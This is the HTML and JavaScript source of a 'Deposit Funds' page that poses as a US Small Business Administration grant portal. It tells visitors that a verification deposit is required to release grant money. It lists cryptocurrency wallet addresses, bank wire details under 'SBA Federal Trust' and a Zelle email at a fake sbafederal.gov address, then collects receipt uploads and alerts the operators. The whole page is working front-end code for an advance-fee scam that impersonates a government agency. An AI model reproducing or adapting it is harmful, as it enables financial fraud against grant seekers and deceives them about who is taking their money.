<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deposit Funds | SBA Portal</title>
    <link rel="stylesheet" href="global.css">
    <style>
        .deposit-container { max-width: 650px; margin: 40px auto; padding: 0 20px; }
        .method-tabs { display: flex; gap: 10px; margin-bottom: 25px; }
        .method-btn { flex: 1; padding: 15px; border: 1px solid var(--border); border-radius: 8px; background: var(--surface); cursor: pointer; text-align: center; font-weight: 600; transition: 0.2s; }
        .method-btn.active { border-color: var(--navy); background: var(--navy-light); color: var(--navy); }
        .address-box { background: var(--bg); padding: 20px; border-radius: 10px; border: 1px solid var(--border); margin-top: 20px; }
        .crypto-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
        .coin-btn { padding: 10px; border: 1px solid var(--border); border-radius: 6px; cursor: pointer; text-align: center; font-size: 0.8rem; font-weight: 700; background: var(--surface); }
        .coin-btn.active { background: var(--navy); color: white; border-color: var(--navy); }
    </style>
</head>
<body>
    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>

    <div class="deposit-container">
        <div id="statusState" class="card" style="display: none; text-align: center; padding: 60px 20px; margin-bottom: 30px;">
            <div id="statusIcon" style="font-size: 4rem; margin-bottom: 20px;"></div>
            <h2 id="statusTitle"></h2>
            <p id="statusMsg"></p>
        </div>

        <div class="card" id="depositForm">
            <h1 style="margin-bottom: 10px;">Fund Your Account</h1>
            <p style="color: var(--text-secondary); margin-bottom: 30px;">A verification deposit is required to activate your grant disbursement wallet.</p>

            <div class="method-tabs">
                <button class="method-btn active" onclick="showMethod('crypto')">Crypto</button>
                <button class="method-btn" onclick="showMethod('bank')">Bank Wire</button>
                <button class="method-btn" onclick="showMethod('zelle')">Zelle</button>
            </div>

            <!-- CRYPTO -->
            <div id="method-crypto" class="method-content">
                <div class="crypto-grid">
                    <button class="coin-btn active" onclick="setCoin('BTC')">BTC</button>
                    <button class="coin-btn" onclick="setCoin('USDT')">USDT</button>
                    <button class="coin-btn" onclick="setCoin('ETH')">ETH</button>
                    <button class="coin-btn" onclick="setCoin('SOL')">SOL</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Network</label>
                    <select id="networkSelect" class="form-select" onchange="updateAddress()"></select>
                </div>
                <div class="address-box">
                    <label class="form-label">Wallet Address</label>
                    <div id="walletAddr" style="word-break: break-all; font-family: monospace; font-weight: 700; margin-bottom: 15px;"></div>
                    <button class="btn btn--outline btn--sm btn--full" onclick="copyAddr()">Copy Address</button>
                </div>
            </div>

            <!-- BANK -->
            <div id="method-bank" class="method-content" style="display: none;">
                <div class="address-box">
                    <p><b>Bank:</b> Chase Bank</p>
                    <p><b>Account:</b> SBA Federal Trust</p>
                    <p><b>Routing:</b> 021000021</p>
                    <p><b>Account #:</b> 4872951630</p>
                </div>
            </div>

            <!-- ZELLE -->
            <div id="method-zelle" class="method-content" style="display: none;">
                <div class="address-box">
                    <p><b>Zelle Email:</b> grants@sbafederal.gov</p>
                    <p><b>Name:</b> SBA Federal Grants</p>
                </div>
            </div>

            <form id="submissionForm" style="margin-top: 30px;">
                <div class="form-group">
                    <label class="form-label">Deposit Amount (USD)</label>
                    <input type="number" id="depAmount" class="form-input" required placeholder="$0.00">
                </div>
                <div class="form-group">
                    <label class="form-label">Upload Transfer Receipt</label>
                    <input type="file" id="depReceipt" accept="image/*" class="form-input" required>
                </div>
                <button type="submit" class="btn btn--primary btn--full btn--lg">Submit Deposit</button>
            </form>
        </div>
    </div>

    <script type="module">
        import { auth, db, updateUserData, compressToBase64, notify, notifyAdmins, addLedgerEntry } from './firebase-config.js';
        import { requireAuth, hideLoader, showToast, copyToClipboard } from './app.js';

        const WALLETS = {
            BTC: { 'Bitcoin': 'bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k' },
            USDT: { 'TRC20': 'TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx', 'ERC20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' },
            ETH: { 'ERC20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' },
            SOL: { 'Solana': '9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4' }
        };

        let currentCoin = 'BTC';

        requireAuth((user, userData) => {
            if (userData.depositStatus !== 'IDLE') {
                const s = document.getElementById('statusState');
                s.style.display = 'block';
                if(userData.depositStatus === 'PENDING') {
                    document.getElementById('statusIcon').innerText = '⏳';
                    document.getElementById('statusTitle').innerText = 'Deposit Pending';
                    document.getElementById('statusMsg').innerText = 'Your deposit is being verified by our finance team.';
                } else if(userData.depositStatus === 'CONFIRMED') {
                    document.getElementById('statusIcon').innerText = '✅';
                    document.getElementById('statusTitle').innerText = 'Deposit Confirmed';
                    document.getElementById('statusMsg').innerText = 'Funds have been added to your balance.';
                }
            }
            hideLoader();
            setCoin('BTC');
        });

        window.showMethod = (m) => {
            document.querySelectorAll('.method-btn').forEach(b => b.classList.toggle('active', b.innerText.toLowerCase().includes(m)));
            document.querySelectorAll('.method-content').forEach(c => c.style.display = c.id === `method-${m}` ? 'block' : 'none');
        };

        window.setCoin = (c) => {
            currentCoin = c;
            document.querySelectorAll('.coin-btn').forEach(b => b.classList.toggle('active', b.innerText === c));
            const select = document.getElementById('networkSelect');
            select.innerHTML = '';
            Object.keys(WALLETS[c]).forEach(net => {
                const opt = document.createElement('option');
                opt.value = net; opt.innerText = net;
                select.appendChild(opt);
            });
            updateAddress();
        };

        window.updateAddress = () => {
            const net = document.getElementById('networkSelect').value;
            document.getElementById('walletAddr').innerText = WALLETS[currentCoin][net];
        };

        window.copyAddr = () => copyToClipboard(document.getElementById('walletAddr').innerText);

        document.getElementById('submissionForm').onsubmit = async (e) => {
            e.preventDefault();
            const receipt = document.getElementById('depReceipt').files[0];
            const amount = document.getElementById('depAmount').value;

            try {
                showToast("Compressing receipt...", "info");
                const base64 = await compressToBase64(receipt);
                const uid = auth.currentUser.uid;

                await updateUserData(uid, {
                    depositStatus: 'PENDING',
                    deposit: { amount, receiptBase64: base64, submittedAt: new Date().toISOString() }
                });

                await addLedgerEntry(uid, {
                    type: 'Deposit',
                    amount: Number(amount),
                    description: `Wallet Funding Deposit`,
                    status: 'PENDING'
                });

                await notifyAdmins({ title: "New Deposit", message: `A user deposited $${amount}`, type: "action" });
                showToast("Deposit submitted", "success");
                setTimeout(() => location.reload(), 1500);
            } catch (err) { showToast(err.message, "error"); }
        };
    </script>
</body>
</html>
